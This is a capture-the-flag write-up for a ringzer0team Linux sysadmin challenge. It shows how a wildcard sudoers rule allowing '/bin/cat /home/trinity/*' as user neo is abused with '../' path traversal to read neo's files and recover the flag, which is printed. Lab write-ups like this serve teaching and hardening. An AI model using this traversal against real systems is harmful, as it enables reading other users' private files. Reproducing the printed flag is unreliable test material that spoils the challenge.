# ringzer0team.com -- SysAdmin Linux -- Level 6

## 1. Challenge

> Find Neo password  
> 
> User: trinity  
> Password: FLAG for the Level 1

Please connect to via SSH:

```bash
$ ssh trinity@challenges.ringzer0team.com -p 10090
```

## 2. Solution

I don't know how to solve this challenge at the beginning. I searched for other's write-ups and found a solution.

This exploit comes from the misconfiguration of sudoers.

Let's see:

```bash
trinity@lxc-sysadmin:~$ sudo -l
[sudo] password for trinity:
Matching Defaults entries for trinity on lxc-sysadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User trinity may run the following commands on lxc-sysadmin:
    (neo) /bin/cat /home/trinity/*
```

You can see that user trinity can run commands looking like `/bin/cat /home/trinity/*` as neo. However, you can use `/../` to go to the parent folder which means you can read every file as neo. So

```bash
trinity@lxc-sysadmin:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
The Oracle        1800-133-7133
Persephone        345-555-1244




change my current password FLAG-lRGLKGh2895wIAoOvcBbgk4oL
don't forget to remove this :)
```

Here's the flag.

